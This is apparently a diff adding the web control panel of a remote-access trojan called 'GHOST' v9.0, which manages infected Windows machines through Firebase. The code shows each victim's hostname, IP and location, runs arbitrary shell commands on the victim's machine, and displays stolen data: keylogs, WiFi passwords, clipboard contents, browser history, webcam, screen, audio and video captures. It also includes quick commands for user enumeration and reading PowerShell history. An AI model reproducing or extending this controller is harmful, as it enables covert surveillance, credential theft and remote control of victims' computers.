+                    <button class="audio-btn danger" onclick="deleteVideo('${v.id}')"><i class="fas fa-trash"></i> DEL</button>
+                </div>
+            </div>
+        `;
+    });
+    container.innerHTML = html;
+}
+
+function playVideoOverlay(id) {
+    const v = recordedVideos.find(x => x.id === id);
+    if (!v || !v.data.video) return;
+    const overlay = document.getElementById('mediaOverlay');
+    document.getElementById('fullImage').style.display = 'none';
+    document.getElementById('fullInfo').style.display = 'none';
+    document.getElementById('navLeft').style.display = 'none';
+    document.getElementById('navRight').style.display = 'none';
+    document.getElementById('galleryCounter').style.display = 'none';
+    document.getElementById('overlayBack').style.display = 'none';
+
+    // Track current item for delete/download
+    currentOverlayItemId = id;
+    currentOverlayItemType = 'video';
+    currentOverlayData = v.data.video;
+    showOverlayActions('video');
+
+    const vid = document.getElementById('fullVideo');
+    vid.style.display = 'block';
+    // Convert base64 to blob URL for reliable playback
+    try {
+        const binary = atob(v.data.video);
+        const bytes = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+        const blob = new Blob([bytes], { type: 'video/mp4' });
+        vid.src = URL.createObjectURL(blob);
+        vid.play();
+        overlay.classList.add('active');
+        vid.onended = function() {
+            const broadcastText = document.getElementById('displayTextInput').value.trim();
+            if (broadcastText && selectedDevice) sendDisplayText();
+        };
+    } catch(e) {
+        vid.src = `data:video/mp4;base64,${v.data.video}`;
+        vid.play();
+        overlay.classList.add('active');
+    }
+}
+
+function downloadVideo(id) {
+    const v = recordedVideos.find(x => x.id === id);
+    if (!v) return;
+    const link = document.createElement('a');
+    link.href = `data:video/mp4;base64,${v.data.video}`;
+    link.download = `video_${id}.mp4`;
+    link.click();
+}
+
+function deleteVideo(id) {
+    if (!confirm('Delete this video recording?')) return;
+    // Delete from Firebase
+    ghostFetch('DELETE', `pcs/${selectedDevice}/captures/${id}`);
+    sendQuickCommand(`/delete_capture ${id}`);
+    const el = document.getElementById(`vid-${id}`);
+    if (el) { el.style.opacity = '0.4'; setTimeout(() => el.remove(), 300); }
+    recordedVideos = recordedVideos.filter(v => v.id !== id);
+    if (recordedVideos.length === 0)
+        document.getElementById('videosContainer').innerHTML = '<p style="color:#666;text-align:center;">No video recordings</p>';
+}
+
+// ===== AUDIO =====
+function addAudioToList(id, data) {
+    if (recordedAudios.find(a => a.id === id)) return;
+    recordedAudios.push({ id, data });
+    const container = document.getElementById('audiosContainer');
+    const time = data.timestamp ? new Date(data.timestamp).toLocaleString() : '';
+    const audioHtml = `
+        <div class="audio-item" id="audio-${id}">
+            <div class="audio-info">
+                <span><i class="fas fa-clock"></i> ${data.duration || '?'}s</span>
+                <span><i class="fas fa-database"></i> ${data.size_kb || 0} KB</span>
+                <span><i class="fas fa-calendar"></i> ${time}</span>
+            </div>
+            <audio controls preload="metadata">
+                <source src="data:audio/wav;base64,${data.audio}" type="audio/wav">
+            </audio>
+            <div class="audio-controls">
+                <button class="audio-btn" onclick="downloadAudio('${id}')"><i class="fas fa-download"></i> Download</button>
+                <button class="audio-btn danger" onclick="deleteAudio('${id}')"><i class="fas fa-trash"></i> Delete</button>
+            </div>
+        </div>
+    `;
+    if (container.innerHTML.includes('No audio')) container.innerHTML = audioHtml;
+    else container.innerHTML = audioHtml + container.innerHTML;
+    container.scrollTop = 0;
+}
+
+function removeAudioFromList(id) {
+    recordedAudios = recordedAudios.filter(a => a.id !== id);
+    const el = document.getElementById(`audio-${id}`);
+    if (el) el.remove();
+    if (recordedAudios.length === 0)
+        document.getElementById('audiosContainer').innerHTML = '<p style="color:#666;text-align:center;">No audio recordings</p>';
+}
+
+function downloadAudio(id) {
+    const audio = recordedAudios.find(a => a.id === id);
+    if (!audio) return;
+    const link = document.createElement('a');
+    link.href = `data:audio/wav;base64,${audio.data.audio}`;
+    link.download = `audio_${id}.wav`;
+    link.click();
+}
+
+function deleteAudio(id) {
+    if (!confirm('Delete this audio recording?')) return;
+    // Delete from Firebase
+    ghostFetch('DELETE', `pcs/${selectedDevice}/captures/${id}`);
+    sendQuickCommand(`/delete_audio ${id}`);
+    const el = document.getElementById(`audio-${id}`);
+    if (el) { el.style.opacity = '0.4'; setTimeout(() => el.remove(), 300); }
+    recordedAudios = recordedAudios.filter(a => a.id !== id);
+    if (recordedAudios.length === 0)
+        document.getElementById('audiosContainer').innerHTML = '<p style="color:#666;text-align:center;">No audio recordings</p>';
+}
+
+// ===== BROWSER HISTORY OVERLAY =====
+function showBrowserHistoryOverlay(history) {
+    const overlay = document.getElementById('mediaOverlay');
+    document.getElementById('fullImage').style.display = 'none';
+    document.getElementById('fullVideo').style.display = 'none';
+    document.getElementById('navLeft').style.display = 'none';
+    document.getElementById('navRight').style.display = 'none';
+    document.getElementById('galleryCounter').style.display = 'none';
+    document.getElementById('overlayBack').style.display = 'none';
+    document.getElementById('overlayActions').style.display = 'none';
+
+    const fullInfo = document.getElementById('fullInfo');
+    fullInfo.style.display = 'block';
+
+    // Group by browser
+    const byBrowser = {};
+    history.forEach(h => {
+        if (!h.url) return;
+        const b = h.browser || 'Unknown';
+        if (!byBrowser[b]) byBrowser[b] = [];
+        byBrowser[b].push(h);
+    });
+
+    let html = '<h2 style="color:#ff00aa;margin-bottom:16px;border-bottom:2px solid #00ff9d;padding-bottom:10px;">' +
+        '<i class="fas fa-history"></i> BROWSER HISTORY — ' + history.filter(h=>h.url).length + ' entries</h2>';
+
+    const browserColors = { Chrome:'#4285f4', Edge:'#0078d4', Firefox:'#ff7139', Brave:'#fb542b', Opera:'#ff1b2d' };
+
+    Object.entries(byBrowser).forEach(([browser, entries]) => {
+        const col = browserColors[browser] || '#00ff9d';
+        html += `<div class="info-section">
+            <div class="info-title" style="color:${col}"><i class="fas fa-globe"></i> ${browser} (${entries.length})</div>
+            <div style="display:flex;flex-direction:column;gap:6px;">`;
+        entries.slice(0, 30).forEach(e => {
+            const title = (e.title || e.url || '').substring(0, 80);
+            const url   = (e.url || '').substring(0, 80);
+            const time  = e.last_visit || '';
+            const visits = e.visits || 0;
+            html += `<div style="background:rgba(0,255,157,0.05);border:1px solid rgba(0,255,157,0.1);border-radius:4px;padding:6px 10px;">
+                <div style="color:#00ff9d;font-size:0.85rem;word-break:break-all;">${escHtml(title)}</div>
+                <div style="color:#888;font-size:0.72rem;margin-top:2px;word-break:break-all;">${escHtml(url)}</div>
+                <div style="color:#555;font-size:0.7rem;margin-top:2px;">${time} &nbsp;|&nbsp; ${visits} visits</div>
+            </div>`;
+        });
+        if (entries.length > 30) html += `<div style="color:#666;font-size:0.8rem;padding:4px;">...and ${entries.length - 30} more</div>`;
+        html += '</div></div>';
+    });
+
+    if (Object.keys(byBrowser).length === 0) {
+        html += '<div style="color:#666;text-align:center;padding:40px;">No history entries with URLs found.</div>';
+    }
+
+    fullInfo.innerHTML = html;
+    overlay.classList.add('active');
+}
+
+// ===== COMMAND RESULT DISPLAY =====
+function displayCommandResult(command, result, timestamp) {
+    if (!result) return;
+    const cmd = (command || '').toLowerCase().trim();
+
+    // Full info — show popup
+    if (result.type === 'full_info' && result.basic) {
+        showInfoOverlay(result);
+        return;
+    }
+
+    // Screenshot / webcam — handled via captures listener
+    if (result.type === 'screenshot' || result.type === 'webcam') return;
+    // Audio handled via captures listener
+    if (result.type === 'audio') return;
+    // Video handled via captures listener
+    if (result.type === 'video') return;
+
+    let outputText = '';
+    if (typeof result === 'object') {
+        if (result.error) outputText = `ERROR: ${result.error}`;
+        else if (result.stdout) outputText = result.stdout;
+        else if (result.stderr) outputText = `STDERR: ${result.stderr}`;
+        else if (result.programs) outputText = `[INSTALLED] ${result.count} programs found`;
+        else if (result.items && result.type === 'startup') {
+            outputText = `[STARTUP] ${result.count} items:\n${result.items.slice(0,8).map(i=>`${i.name} → ${i.source}`).join('\n')}`;
+        }
+        else if (result.wifi && result.type === 'wifi_passwords') {
+            outputText = `[WIFI PASSWORDS] ${result.count} networks:\n${result.wifi.map(w=>`${w.ssid}: ${w.password}`).join('\n')}`;
+        }
+        else if (result.files && result.type === 'recent_files') {
+            outputText = `[RECENT] ${result.count} files:\n${result.files.slice(0,8).map(f=>`${f.modified} — ${f.name}`).join('\n')}`;
+        }
+        else if (result.apps) {
+            outputText = `[APPS] ${result.count}:\n${result.apps.slice(0,15).map(a=>`${a.title} [${a.process}]`).join('\n')}`;
+        }
+        else if (result.content !== undefined && result.type === 'clipboard') {
+            outputText = `[CLIPBOARD] ${result.length} chars:\n${result.content.substring(0,300)}`;
+        }
+        else if (result.env) {
+            outputText = `[ENV] ${result.total_count} total:\n${Object.entries(result.env).slice(0,15).map(([k,v])=>`${k}=${String(v).substring(0,50)}`).join('\n')}`;
+        }
+        else if (result.drives) {
+            outputText = `[DRIVES] ${result.count}:\n${result.drives.map(d=>`${d.device} → ${d.used}/${d.total} (${d.percent})`).join('\n')}`;
+        }
+        else if (result.type === 'taskkill') {
+            outputText = result.killed ? `Killed: ${result.killed.join(', ')}` : result.message || 'Not found';
+        }
+        else if (result.events) {
+            outputText = `[SYSLOG] ${result.count}:\n${result.events.slice(0,5).map(e=>`[${e.type}] ${e.source}: ${e.message.substring(0,60)}`).join('\n')}`;
+        }
+        else if (result.history !== undefined && result.type === 'browser_history') {
+            const hist = result.history || [];
+            const cnt  = result.count || hist.length;
+            if (hist.length === 0) {
+                outputText = '[BROWSER HISTORY] No history found.';
+            } else {
+                // Show in overlay for easy reading
+                showBrowserHistoryOverlay(hist);
+                outputText = `[BROWSER HISTORY] ${cnt} entries — showing in overlay`;
+            }
+        }
+        else if (result.networks) {
+            outputText = `[WIFI] ${result.count} networks:\n${result.networks.slice(0,15).join('\n')}`;
+        }
+        else if (result.type === 'wifi') {
+            outputText = `[WIFI] Found: ${result.networks ? result.networks.join(', ') : 'none'}`;
+        }
+        else if (result.logs !== undefined && result.type === 'keylogs') {
+            // Manual /keylogs fetch — merge into live buffer
+            const logs = result.logs || [];
+            if (logs.length > 0) {
+                liveKeyBuffer = logs.map(k => ({
+                    type: k.type || 'char',
+                    key: k.key || '',
+                    timestamp: k.timestamp || '',
+                    window: k.window || 'Unknown'
+                }));
+                renderLiveKeylogs();
+                document.getElementById('keylogCount').textContent = liveKeyBuffer.length;
+            }
+            // Update status from stats
+            if (result.stats) {
+                updateKeylogStatus(result.stats.enabled === true);
+            }
+            outputText = `[KEYLOGS] ${logs.length} keys in buffer`;
+        }
+        else if (result.commands) outputText = result.commands.join('\n');
+        else if (result.status === 'enabled' || result.status === 'already_enabled') {
+            updateKeylogStatus(true);
+            outputText = result.message || 'Keylogging enabled';
+        }
+        else if (result.status === 'disabled' || result.status === 'already_disabled') {
+            updateKeylogStatus(false);
+            outputText = result.message || 'Keylogging disabled';
+        }
+        else if (result.message) outputText = result.message;
+        else if (result.status) outputText = `Status: ${result.status}`;
+        else outputText = JSON.stringify(result, null, 2).substring(0, 1000);
+    } else {
+        outputText = String(result);
+    }
+
+    if (outputText.length > 5000) outputText = outputText.substring(0, 5000) + '\n...[truncated]';
+    addToTerminal(command, outputText, 'response', timestamp);
+}
+
+// ===== DEVICE GRID =====
+function updateDeviceGrid(devices) {
+    const grid = document.getElementById('deviceGrid');
+    let html = '';
+    Object.entries(devices).forEach(([deviceId, data]) => {
+        const info = data.info || {};
+        const isOnline = info._online === true;
+        const profileImage = info.profile_image ?
+            `data:image/png;base64,${info.profile_image}` :
+            'https://via.placeholder.com/50/000000/00ff9d?text=PC';
+        const selectedClass = selectedDevice === deviceId ? 'selected' : '';
+        html += `
+            <div class="device-card ${selectedClass}" onclick="selectDevice('${deviceId}', this)">
+                <div class="device-header">
+                    <img src="${profileImage}" class="device-avatar" alt="Profile">
+                    <div>
+                        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+                            <div class="device-status ${isOnline ? '' : 'offline'}"></div>
+                            <strong>${info.hostname || 'Unknown'}</strong>
+                            ${!isOnline ? '<span class="offline-badge">OFFLINE</span>' : ''}
+                        </div>
+                        <div class="device-info">${info.username || 'Unknown'}</div>
+                    </div>
+                </div>
+                <div class="device-info">
+                    <div>IP: ${info.local_ip || '0.0.0.0'}</div>
+                    <div><i class="fas fa-map-marker-alt"></i> ${info.city || 'Unknown'}, ${info.country || 'Unknown'}</div>
+                </div>
+            </div>
+        `;
+    });
+    if (Object.keys(devices).length === 0) {
+        html = '<div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i><p>Waiting for devices...</p></div>';
+    }
+    grid.innerHTML = html;
+}
+
+function updateOnlineCount() {
+    const online = Object.values(devices).filter(d => d.info?._online === true).length;
+    document.getElementById('onlineCount').textContent = `${online} ONLINE`;
+}
+
+function selectDevice(deviceId, element) {
+    if (selectedDevice && database) {
+        database.ref(`pcs/${selectedDevice}/captures`).off();
+        database.ref(`pcs/${selectedDevice}/results`).off();
+        if (liveKeylogRef) { liveKeylogRef.off(); liveKeylogRef = null; }
+        if (_keylogStatsRef) { _keylogStatsRef.off(); _keylogStatsRef = null; }
+        database.ref(`display/${selectedDevice}`).off();
+        database.ref(`broadcast/${selectedDevice}`).off();
+        database.ref(`keylogs/${selectedDevice}/_stats`).off();
+    }
+    selectedDevice = deviceId;
+    document.querySelectorAll('.device-card').forEach(c => c.classList.remove('selected'));
+    element.classList.add('selected');
+    document.getElementById('commandInput').disabled = false;
+    document.getElementById('sendCommand').disabled = false;
+    updateSelectedDeviceInfo(devices[deviceId]);
+    resetMediaPreviews();
+    recordedAudios = [];
+    recordedVideos = [];
+    clearKeylogDisplay();
+    liveKeyBuffer = [];
+    setDisplayStatus(false, '');
+    document.getElementById('displayTextInput').value = '';
+    document.getElementById('audiosContainer').innerHTML = '<p style="color:#666;text-align:center;">No audio recordings</p>';
+    document.getElementById('videosContainer').innerHTML = '<p style="color:#666;text-align:center;">No video recordings</p>';
+    commandHistory = [];
+    updateCommandHistory();
+    addToTerminal('SYSTEM', `Connected to ${devices[deviceId]?.info?.hostname || 'Unknown'}`, 'system');
+    setupRealtimeListeners();
+}
+
+function updateSelectedDeviceInfo(device) {
+    if (!device) {
+        document.getElementById('selectedDeviceInfo').innerHTML = `
+            <div class="panel-title"><i class="fas fa-desktop"></i> TARGET</div>
+            <div style="text-align:center;color:#666;">
+                <i class="fas fa-ban" style="font-size:2rem;"></i><p>No device selected</p>
+            </div>
+        `;
+        return;
+    }
+    const info = device.info || {};
+    document.getElementById('selectedDeviceInfo').innerHTML = `
+        <div class="panel-title"><i class="fas fa-desktop"></i> ${info.hostname || 'Unknown'}</div>
+        <div style="text-align:center;margin-bottom:15px;">
+            <img src="${info.profile_image ? 'data:image/png;base64,'+info.profile_image : 'https://via.placeholder.com/100'}"
+                 style="width:100px;height:100px;border-radius:50%;border:3px solid #00ff9d;">
+        </div>
+        <div style="font-size:0.9rem;">
+            <p><i class="fas fa-user"></i> User: ${info.username || 'Unknown'}</p>
+            <p>IP: ${info.local_ip || 'Unknown'} (${info.public_ip || 'Unknown'})</p>
+            <p><i class="fas fa-map-marker-alt"></i> ${info.city || 'Unknown'}, ${info.country || 'Unknown'}</p>
+        </div>
+    `;
+}
+
+// ===== TERMINAL =====
+function addToTerminal(command, output, type = 'command', timestamp = null) {
+    const terminal = document.getElementById('terminalBody');
+    const line = document.createElement('div');
+    line.className = 'terminal-line';
+    const time = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();
+    terminalHistory.push({ time, command, output, type });
+    if (terminalHistory.length > 1000) terminalHistory = terminalHistory.slice(-1000);
+    if (type === 'response') {
+        line.innerHTML = `
+            <span class="terminal-time">[${time}]</span>
+            <span class="terminal-prompt">#></span>
+            <span class="terminal-output">${escHtml(String(output || '')).replace(/\n/g,'<br>')}</span>
+        `;
+    } else if (type === 'command') {
+        line.innerHTML = `
+            <span class="terminal-time">[${time}]</span>
+            <span class="terminal-prompt">$></span>
+            <span class="terminal-command">${escHtml(String(command))}</span>
+        `;
+    } else {
+        line.innerHTML = `
+            <span class="terminal-time">[${time}]</span>
+            <span class="terminal-prompt">S></span>
+            <span style="color:#00ccff;">${escHtml(String(command))}: ${escHtml(String(output||''))}</span>
+        `;
+    }
+    terminal.appendChild(line);
+    terminal.scrollTop = terminal.scrollHeight;
+    saveTerminalHistory();
+}
+
+function clearTerminal() {
+    document.getElementById('terminalBody').innerHTML = '';
+    addToTerminal('SYSTEM', 'Terminal cleared', 'system');
+}
+
+function downloadTerminal() {
+    let content = 'GHOST TERMINAL LOG v9.0\n' + '='.repeat(50) + '\n';
+    content += `Generated: ${new Date().toLocaleString()}\n` + '='.repeat(50) + '\n\n';
+    terminalHistory.forEach(e => {
+        content += `[${e.time}] `;
+        content += e.type === 'command' ? `$> ${e.command}\n` : `#> ${e.output || ''}\n`;
+        content += '-'.repeat(30) + '\n';
+    });
+    const blob = new Blob([content], { type: 'text/plain' });
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = `ghost_terminal_${Date.now()}.log`;
+    link.click();
+}
+
+function saveTerminalHistory() {
+    try {
+        localStorage.setItem('terminalHistory', JSON.stringify(terminalHistory.slice(-100)));
+        localStorage.setItem('commandHistory', JSON.stringify(commandHistory.slice(-20)));
+    } catch(e) {}
+}
+
+function loadTerminalHistory() {
+    try {
+        const saved = localStorage.getItem('terminalHistory');
+        if (saved) {
+            const history = JSON.parse(saved);
+            history.forEach(entry => {
+                const line = document.createElement('div');
+                line.className = 'terminal-line';
+                line.innerHTML = `
+                    <span class="terminal-time">[${entry.time}]</span>
+                    <span class="terminal-prompt">${entry.type === 'command' ? '$>' : '#>'}</span>
+                    <span class="${entry.type === 'command' ? 'terminal-command' : 'terminal-output'}">${escHtml(String(entry.command||''))}</span>
+                `;
+                document.getElementById('terminalBody').appendChild(line);
+            });
+            terminalHistory = history;
+        }
+    } catch(e) {}
+}
+
+function loadCommandHistory() {
+    try {
+        const saved = localStorage.getItem('commandHistory');
+        if (saved) {
+            commandHistory = JSON.parse(saved);
+            updateCommandHistory();
+        }
+    } catch(e) {}
+}
+
+function addToCommandHistory(command) {
+    commandHistory.unshift({ command, time: new Date().toLocaleTimeString() });
+    if (commandHistory.length > 20) commandHistory = commandHistory.slice(0, 20);
+    updateCommandHistory();
+}
+
+function updateCommandHistory() {
+    const container = document.getElementById('commandHistory');
+    if (commandHistory.length === 0) {
+        container.innerHTML = '<p style="color:#666;">No commands yet</p>';
+        return;
+    }
+    container.innerHTML = commandHistory.map(cmd => `
+        <div class="command-item" onclick="document.getElementById('commandInput').value='${escHtml(cmd.command)}'">
+            <span style="color:#888;">[${cmd.time}]</span> ${escHtml(cmd.command)}
+        </div>
+    `).join('');
+}
+
+// ===== SEND COMMAND =====
+function sendQuickCommand(command) {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    document.getElementById('commandInput').value = command;
+    executeCommand();
+}
+
+function executeCommand() {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    const input = document.getElementById('commandInput');
+    const command = input.value.trim();
+    if (!command) return;
+    addToTerminal(command, '', 'command');
+    addToCommandHistory(command);
+    ghostFetch('POST', `commands/${selectedDevice}`, {
+        command: command,
+        timestamp: new Date().toISOString()
+    }).then(r => { if (!r) addToTerminal('ERROR', 'Failed to send command', 'system'); });
+    input.value = '';
+    saveTerminalHistory();
+}
+
+// ===== PROMPTS =====
+function promptOpenTarget() {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    const target = prompt('Enter URL (https://...) or app name to open:');
+    if (target && target.trim()) sendQuickCommand('/open ' + target.trim());
+}
+
+function promptSetClip() {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    const txt = prompt('Enter text to set in target clipboard:');
+    if (txt !== null && txt.trim()) sendQuickCommand('/setclip ' + txt.trim());
+}
+
+function promptWallpaper() {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    const url = prompt('Enter image URL for wallpaper (https://...):');
+    if (url && url.trim()) sendQuickCommand('/wallpaper ' + url.trim());
+}
+
+function promptVideoRecord() {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    const sec = prompt('Record duration in seconds (max 20, default 15):', '15');
+    if (sec !== null) {
+        const d = Math.min(20, Math.max(1, parseInt(sec) || 15));
+        sendQuickCommand(`/video ${d}`);
+    }
+}
+
+// ===== ONLINE COUNT =====
+function updateOnlineCount() {
+    const online = Object.values(devices).filter(d => d.info?._online === true).length;
+    document.getElementById('onlineCount').textContent = `${online} ONLINE`;
+}
+
+// ===== EVENT LISTENERS =====
+document.getElementById('sendCommand').addEventListener('click', executeCommand);
+document.getElementById('commandInput').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') executeCommand();
+});
+
+setInterval(updateOnlineCount, 5000);
+setInterval(saveTerminalHistory, 30000);
+</script>
+
+<!-- ===== CMD TERMINAL PAGE ===== -->
+<div id="cmdPage">
+    <div class="cmd-topbar">
+        <div style="display:flex;align-items:center;">
+            <button class="cmd-back" onclick="closeCmdPage()"><i class="fas fa-arrow-left"></i>&nbsp;BACK</button>
+            <span class="cmd-title"><i class="fas fa-terminal"></i> CMD TERMINAL</span>
+            <span class="cmd-device-lbl" id="cmdDevLbl"></span>
+        </div>
+        <div class="cmd-toolbar">
+            <span id="cmdOnlineLbl" style="font-size:.75rem;margin-right:4px;"></span>
+            <button class="cmd-tool-btn" onclick="clearCmdOutput()"><i class="fas fa-eraser"></i> Clear</button>
+            <button class="cmd-tool-btn" onclick="downloadCmdLog()"><i class="fas fa-download"></i> Save</button>
+        </div>
+    </div>
+    <div class="cmd-output" id="cmdOutput"></div>
+    <div class="cmd-sug-bar">
+        <span style="color:#333;font-size:.7rem;margin-right:4px;">Quick:</span>
+        <div class="cmd-sug" onclick="cmdQuick('dir')">dir</div>
+        <div class="cmd-sug" onclick="cmdQuick('whoami')">whoami</div>
+        <div class="cmd-sug" onclick="cmdQuick('ipconfig /all')">ipconfig /all</div>
+        <div class="cmd-sug" onclick="cmdQuick('tasklist')">tasklist</div>
+        <div class="cmd-sug" onclick="cmdQuick('systeminfo')">systeminfo</div>
+        <div class="cmd-sug" onclick="cmdQuick('netstat -an')">netstat -an</div>
+        <div class="cmd-sug" onclick="cmdQuick('net user')">net user</div>
+        <div class="cmd-sug" onclick="cmdQuick('net localgroup administrators')">admins</div>
+        <div class="cmd-sug" onclick="cmdQuick('wmic cpu get name')">cpu info</div>
+        <div class="cmd-sug" onclick="cmdQuick('arp -a')">arp -a</div>
+        <div class="cmd-sug" onclick="cmdQuick('ping -n 4 google.com')">ping</div>
+        <div class="cmd-sug" onclick="cmdQuick('tree C:\\Users /F')">user tree</div>
+        <div class="cmd-sug" onclick="cmdQuick('wmic logicaldisk get size,freespace,caption')">drives</div>
+        <div class="cmd-sug" onclick="cmdQuick('type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')">ps history</div>
+    </div>
+    <div class="cmd-inp-bar">
+        <span class="cmd-ps1">C:\&gt;</span>
+        <input class="cmd-inp" id="cmdInp" placeholder="Any Windows CMD command — full output guaranteed..." onkeydown="cmdKeydown(event)" autocomplete="off" spellcheck="false">
+        <button class="cmd-run-btn" onclick="runCmdCommand()"><i class="fas fa-bolt"></i> RUN</button>
+    </div>
+</div>
+
+<script>
+// ===== CMD TERMINAL =====
+let _cmdHist = [], _cmdHistIdx = -1, _cmdSentKeys = new Set(), _cmdListRef = null;
+
+function openCmdPage() {
+    if (!selectedDevice) { alert('Select a device first'); return; }
+    document.getElementById('cmdPage').style.display = 'flex';
+    const info = devices[selectedDevice] || {};
+    document.getElementById('cmdDevLbl').textContent = '\u2014 ' + (info.hostname || selectedDevice);
+    const online = (info._online === true);
+    const lbl = document.getElementById('cmdOnlineLbl');
+    lbl.textContent = online ? '\u25CF ONLINE' : '\u25CB OFFLINE';
+    lbl.style.color  = online ? '#00ff9d' : '#ff0055';
+    if (!document.getElementById('cmdOutput').children.length) {
+        _cmdSysLine('GHOST CMD TERMINAL v9.0');
+        _cmdSysLine('Device: ' + (info.hostname || selectedDevice));
+        _cmdSysLine('Full output, no truncation. Arrow keys = history.');
+    }
+    _setupCmdListener();
+    setTimeout(() => document.getElementById('cmdInp').focus(), 80);
+}
+
+function closeCmdPage() {
+    document.getElementById('cmdPage').style.display = 'none';
+    if (_cmdListRef) { _cmdListRef.off(); _cmdListRef = null; }
+}
+
+function _setupCmdListener() {
+    if (!database || !selectedDevice) return;
+    if (_cmdListRef) { _cmdListRef.off(); _cmdListRef = null; }
+    const ref = database.ref('pcs/' + selectedDevice + '/results');
+    const seen = new Set();
+    ref.once('value', snap => {
+        if (snap.val()) Object.keys(snap.val()).forEach(k => seen.add(k));
+        _cmdListRef = ref;
+        ref.on('child_added', snap => {
+            if (seen.has(snap.key)) return;
+            seen.add(snap.key);
+            if (!_cmdSentKeys.has(snap.key)) return;
+            _cmdSentKeys.delete(snap.key);
+            _removeCmdWait();
+            _displayCmdResult(snap.val());
+        });
+    });
+}
+
+async function runCmdCommand() {
+    if (!selectedDevice) { alert('Select a device first'); return; }
+    const inp = document.getElementById('cmdInp');
+    const raw = inp.value.trim();
+    if (!raw) return;
+    inp.value = '';
+    if (_cmdHist[0] !== raw) _cmdHist.unshift(raw);
+    if (_cmdHist.length > 100) _cmdHist.pop();
+    _cmdHistIdx = -1;
+    _addCmdInputLine(raw);
+    _addCmdWait();
+    const result = await ghostFetch('POST', 'commands/' + selectedDevice, {
+        command: '/shell ' + raw,
+        timestamp: new Date().toISOString()
+    });
+    if (result && result.name) {
+        _cmdSentKeys.add(result.name);
+    } else {
+        _removeCmdWait();
+        _cmdSysLine('\u2717 Failed to send — device offline or Worker error', '#ff0055');
+    }
+    inp.focus();
+}
+
+function cmdQuick(cmd) {
+    document.getElementById('cmdInp').value = cmd;
+    document.getElementById('cmdInp').focus();
+}
+
+function cmdKeydown(e) {
+    if (e.key === 'Enter') { runCmdCommand(); return; }
+    const inp = document.getElementById('cmdInp');
+    if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        if (_cmdHistIdx < _cmdHist.length - 1) { _cmdHistIdx++; inp.value = _cmdHist[_cmdHistIdx] || ''; }
+    } else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (_cmdHistIdx > 0) { _cmdHistIdx--; inp.value = _cmdHist[_cmdHistIdx] || ''; }
+        else { _cmdHistIdx = -1; inp.value = ''; }
+    }
+}
+
+function _addCmdInputLine(raw) {
+    const out = document.getElementById('cmdOutput');
+    const b = document.createElement('div');
+    b.className = 'cmd-block';
+    b.innerHTML = '<div class="cmd-inp-row"><span class="cmd-ps2">C:\\&gt;</span><span class="cmd-inp-txt">' +
+        _esc(raw) + '</span><span class="cmd-ts">' + new Date().toLocaleTimeString() + '</span></div>';
+    out.appendChild(b);
+    out.scrollTop = out.scrollHeight;
+}
+
+function _addCmdWait() {
+    const out = document.getElementById('cmdOutput');
+    const el = document.createElement('div');
+    el.id = 'cmdWaitLine';
+    el.className = 'cmd-wait-line';
+    el.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Waiting for device response...';
+    out.appendChild(el);
+    out.scrollTop = out.scrollHeight;
+    setTimeout(() => { _removeCmdWait(); if(_cmdSentKeys.size) _cmdSysLine('Timeout (70s) — no response', '#ff0055'); }, 70000);
+}
+
+function _removeCmdWait() {
+    const el = document.getElementById('cmdWaitLine');
+    if (el) el.remove();
+}
+
+function _displayCmdResult(data) {
+    const res = data && data.result;
+    if (!res) return;
+    if (['screenshot','webcam','video','audio','full_info'].includes(res.type)) return;
+    const out = document.getElementById('cmdOutput');
+    const b = document.createElement('div');
+    b.className = 'cmd-block';
+    let html = '';
+    if (res.stdout !== undefined || res.stderr !== undefined) {
+        const so = (res.stdout || '').trimEnd();
+        const se = (res.stderr || '').trimEnd();
+        if (so) html += '<div class="cmd-stdout">' + _esc(so) + '</div>';
+        if (se) html += '<div class="cmd-stderr">' + _esc(se) + '</div>';
+        html += '<div class="cmd-exit">exit: ' + (res.code !== undefined ? res.code : 0) + '</div>';
+    } else if (res.error) {
+        html = '<div class="cmd-stderr">' + _esc(res.error) + '</div>';
+    } else if (res.message || res.status) {
+        html = '<div class="cmd-stdout" style="color:#00ff9d">' + _esc(res.message || res.status) + '</div>';
+    } else {
+        html = '<div class="cmd-stdout">' + _esc(JSON.stringify(res, null, 2)) + '</div>';
+    }
+    b.innerHTML = html;
+    out.appendChild(b);
+    out.scrollTop = out.scrollHeight;
+}
+
+function _cmdSysLine(msg, color) {
+    const out = document.getElementById('cmdOutput');
+    const el = document.createElement('div');
+    el.className = 'cmd-sys';
+    if (color) el.style.color = color;
+    el.textContent = '[SYS] ' + msg;
+    out.appendChild(el);
+    out.scrollTop = out.scrollHeight;
+}
+
+function clearCmdOutput() {
+    document.getElementById('cmdOutput').innerHTML = '';
+    _cmdSysLine('Terminal cleared.');
+}
+
+function downloadCmdLog() {
+    const text = Array.from(document.getElementById('cmdOutput').querySelectorAll('div'))
+        .map(el => el.innerText || '').filter(Boolean).join('\n');
+    const blob = new Blob(['GHOST CMD LOG\n' + '='.repeat(40) + '\n' + text], {type:'text/plain'});
+    Object.assign(document.createElement('a'), {
+        href: URL.createObjectURL(blob),
+        download: 'cmd_' + Date.now() + '.txt'
+    }).click();
+}
+
+function _esc(s) {
+    return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+</script>
+
+</body>
+</html>
